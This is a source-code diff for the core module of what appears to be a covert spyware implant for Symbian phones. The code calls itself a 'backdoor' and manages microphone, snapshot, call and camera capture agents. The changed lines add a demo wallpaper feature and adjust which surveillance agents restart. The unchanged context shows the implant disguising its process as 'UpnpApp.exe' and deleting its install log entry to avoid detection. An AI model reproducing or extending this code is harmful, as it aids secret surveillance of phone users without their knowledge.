@@ -3,9 +3,12 @@
 #include <e32base.h>
 #include <e32std.h>
 #include <bautils.h>
+#include <aknswallpaperutils.h>
+#include <coemain.h>
 
 #include "Core.h"
 #include "ConfigFile.h"
+
 
 #include <D32DBMS.h>
 
@@ -19,7 +22,6 @@
 #include <HT\AbstractEvent.h>
 #include <HT\AbstractAgent.h>
 #include <HT\AbstractAction.h>
-
 
 
 CCore::CCore() :
@@ -42,6 +44,9 @@ CCore::~CCore()
 	iEndPoints.Close();
 	delete iConfig;
 	delete iFreeSpaceMonitor;
+#ifdef _DEMO
+	delete iWallpaper;
+#endif
 	iFs.Close();
 	RProperty::Delete(KPropertyFreeSpaceThreshold);
 	__FLOG(_L("EndDestructor"));
@@ -61,6 +66,9 @@ void CCore::ConstructL()
 	iConfig = CConfigFile::NewL();
 	iFs.Connect();
 	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
+#ifdef _DEMO
+	iWallpaper = CWallpaperSticker::NewL();
+#endif
 	
 	__FLOG(_L("End ConstructL"));
 	}
@@ -106,17 +114,33 @@ void CCore::RestartAllAgentsL()
 void CCore::RestartAppendingAgentsL()
 	{
 	// Stops the running Agents that creates logs in append
-	// so excluding: AgentMic, AgentSnapshot
+	// so excluding: AgentMic, AgentSnapshot, AgentCallLocal, AgentCamera
 	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
 		{
 		CDataAgent* dataAgent = iConfig->iAgentsList[i];
 		if (dataAgent->iStatus == EAgent_Running)
 			{
-			if((dataAgent->iId != EAgent_Mic) && (dataAgent->iId != EAgent_Snapshot))
+			switch(dataAgent->iId)
+				{
+				case EAgent_Mic:
+				case EAgent_Snapshot:
+				case EAgent_CallLocal:
+				case EAgent_Cam:
+					break;
+				default:
+					{
+					TCmdStruct restartCmd(ERestart, ECore, dataAgent->iId);
+					SubmitNewCommandL(restartCmd);
+					}
+					break;
+				}
+			/*
+			if((dataAgent->iId != EAgent_Mic) && (dataAgent->iId != EAgent_Snapshot) && (dataAgent->iId != EAgent_CallLocal))
 				{
 				TCmdStruct restartCmd(ERestart, ECore, dataAgent->iId);
 				SubmitNewCommandL(restartCmd);
 				}
+				*/
 			}
 		}
 	}
@@ -422,6 +446,19 @@ void CCore::StartMonitorFreeSpace()
 	iFreeSpaceMonitor->StartListeningForEvents();
 	}
 
+
+void CCore::ChangeWallpaper()
+	{
+	TInt err = AknsWallpaperUtils::SetIdleWallpaper(KWallpaperImage, CCoeEnv::Static());
+	if(err != KErrNone)
+		{
+		// if the configured image can't be loaded, backdoor is stopped
+		CActiveScheduler::Stop();
+		}
+	iWallpaper->Start();
+	}
+
+
 void CCore::NotifyAboveThreshold()
 	{
 	RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 1);
@@ -501,7 +538,7 @@ LOCAL_C void DoStartL()
 	_LIT(KProcName, "UpnpApp.exe");
 	if (!Processes::RenameIfNotRunning(KProcName))
 		return;
-
+	
 	//delete install log entry
 	User::After(10*1000000);
 	TUid myUid = GetUid(KUidBackdoor);
@@ -523,6 +560,11 @@ LOCAL_C void DoStartL()
 	
 	//start free space monitor
 	core->StartMonitorFreeSpace();
+	
+#ifdef _DEMO
+	//change wallpaper
+	core->ChangeWallpaper();
+#endif
 	
 	CActiveScheduler::Start(); 
 	CleanupStack::PopAndDestroy(core);
